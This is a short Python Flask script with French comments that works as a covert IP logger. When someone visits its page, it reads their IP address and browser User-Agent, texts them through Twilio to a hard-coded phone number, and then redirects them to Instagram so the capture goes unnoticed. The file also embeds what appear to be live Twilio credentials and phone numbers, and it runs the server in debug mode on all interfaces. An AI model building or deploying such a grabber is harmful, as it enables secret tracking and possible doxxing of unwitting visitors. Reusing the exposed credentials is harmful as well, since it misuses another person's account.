from flask import Flask, request, redirect
from twilio.rest import Client
import traceback

app = Flask(__name__)

# Informations Twilio
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = 'ec746c04233667b9836c82d9512a9ee9'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

# Fonction d'envoi de SMS
def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    try:
        message = client.messages.create(
            body=body,
            from_=from_number,
            to=to_number
        )
        print(f"✅ Message sent: {message.sid}")
    except Exception as e:
        print("❌ Error sending SMS:")
        traceback.print_exc()  # Affiche les détails de l'erreur dans la console

# Route principale
@app.route('/')
def index():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    print(f"🔎 IP: {ip_address}, User-Agent: {user_agent}")

    send_sms(ip_address, user_agent)

    return redirect("https://www.instagram.com")  # Redirection personnalisée

# Lancement du serveur
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
